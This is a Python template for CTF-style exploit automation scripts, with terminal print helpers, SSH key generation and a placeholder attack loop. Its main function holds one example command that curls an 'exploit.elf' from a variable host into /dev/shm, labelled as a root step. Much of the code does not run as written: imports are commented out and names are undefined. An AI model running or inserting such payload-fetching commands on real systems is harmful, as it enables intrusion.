#!/usr/bin/env python
# Because you may not want to spoil the terminal
# from warnings import filterwarnings
# filterwarnings("ignore")
import argparse
import sys
import time
from termcolor import colored
# import requests
# import subprocess
# import re
# import os

#
#
# This template is notes from https://github.com/sumanrox/sidequest-exploits ; I liked these scripts, but I also wanted to make some myself for all sorts of things
#
#


# Classes are used to store data rather as classes with methods

# The real thinking has to be done with regard to Write Isthisarabbithole Read Executing Through Protocols
# E.I
# Windows is UTF-16Le if we need to write somewhere
def getLine(output, lineNumber):
    # Split the output by newline characters
    lines = output.split('\n')
    # Get the line at the specified line_number
    if 0 < lineNumber <= len(lines):
        # Remove leading and trailing whitespace
        return lines[lineNumber - 1].strip()
    else:
        return None
        
def readFile(connection,command,prompt=b"# "):
    connection.write(command.encode("utf-8") + b"\n")
    # Read until you receive the prompt twice to capture the full output
    fileContent = connection.read_until(prompt, timeout=5).decode("utf-8")
    fileContent += connection.read_until(prompt, timeout=5).decode("utf-8")
    return fileContent 

# If we need RSA Keys:
def generateSSHKeys():
    key = paramiko.RSAKey.generate(2048)
    private_key_path = './binaries/id_rsa'
    public_key_path = './binaries/id_rsa.pub'

    with open(private_key_path, 'w') as private_key_file:
        key.write_private_key(private_key_file)

    with open(public_key_path, 'w') as public_key_file:
        public_key_file.write(f"{key.get_name()} {key.get_base64()}\n")
        
    os.system('chmod 600 ./binaries/id_rsa')
    os.system('chmod 600 ./binaries/id_rsa.pub')
    return True

def checkSSHKeys():
    private="./binaries/id_rsa"
    public="./binaries/id_rsa.pub"
    currentDirectory=os.getcwd()
    privateExist = os.path.join(currentDirectory, private)
    publicExist = os.path.join(currentDirectory, public)
    if (os.path.isfile(privateExist) and os.path.isfile(publicExist)):
        return True
    else:
        return False

# Cleanup 
def cleanup():
    if os.path.exists('./binaries/id_rsa') or os.path.exists('./binaries/id_rsa.pub'):
        try:
            os.remove("./binaries/id_rsa")
            os.remove("./binaries/id_rsa.pub")
        except Exception as e:
            sys.exit(0)


# Flushing stdout
def stylePrint(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)

# This is used style really
def print_dangerous(message):
    dangerous_icon = colored("[âœ”] ðŸ’€", 'red')  # You can customize the icon
    decorated_message = f"{dangerous_icon} {colored(message, 'red')}\n"
    stylePrint(decorated_message)

# print_settings used when there is no success boolean and value is instead passed to be printed
def print_setting(setting_name, value):
    tick_mark = colored("[âœ”]", 'green')
    statement = colored(f"{setting_name}", 'white')
    machine_value = colored(value, 'yellow')
    stylePrint(f"{tick_mark} {statement}\t: {machine_value}\n")
    time.sleep(0.2)

# Errors and Success to stdout use: 
def print_statement(setting_name, success=True):
    if success:
        tick_mark = colored("[âœ”]", 'yellow')
        statement = colored(f"{setting_name}", 'white')
        stylePrint(f"{tick_mark} {statement}\n")
    else:
        cross_mark = colored("[âœ–]", 'red')
        statement = colored(f"{setting_name}", 'red')
        stylePrint(f"{cross_mark} {statement}\n")

def example_automated_action(command,connection):
    try:
        print("stuff would be done here")
        print("if it was http requests would use requests.X wrapped in this function")
        print("")
    except KeyboardInterrupt:
        sys.exit(1)
    except Exception as e:
        print_statement(f"Error doing something: {e}",success=False)



# Main does not always need to be used
# argparse always occurs in __name... etc
# It is an either or if using def main(): add just main to if __name...etc
# else put everything that would be in 
def main():
    # All nice print strings that are passed to print_X functions
    # All strings that commands or one-liners
    # If some thing is done multiple times in a similar way it is a list:
    SomeListDeclaredAbove={
        "ðŸ’€ Root for the root god, NT Systems for the FlagPwn":f"curl http://{somevariblehere}/exploit.elf -o /dev/shm/shimmy-ya"
        # ... ad nausuem!
    }   
    # Arguments are built to be passed to functions: connection=conection_library.Function(Args) ->  
    # Actions are then linear to attack/automation chain.
    for command in SomeListDeclaredAbove: # As a list the value is used not the key, but when printed both nice emoji and string are used
        data=command.split("-")
        print_statement(f"{data[0]}\t\t\t\t: {colored(data[1],'yellow')}")
        response_or_stdout = example_automated_action(command=command,connection=contection)

# argparse is always use here
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(description="Description Goes here")
        parser.add_argument("--bigflag", "-b", dest="ArgVariableNameHere", required=True, help="Help string here")
        args = parser.parse_args()
        if not isAlive(args.bigflag): # Simple check - i.e ping a machine is it alive?
            # print, logging goes here
            sys.exit(0)
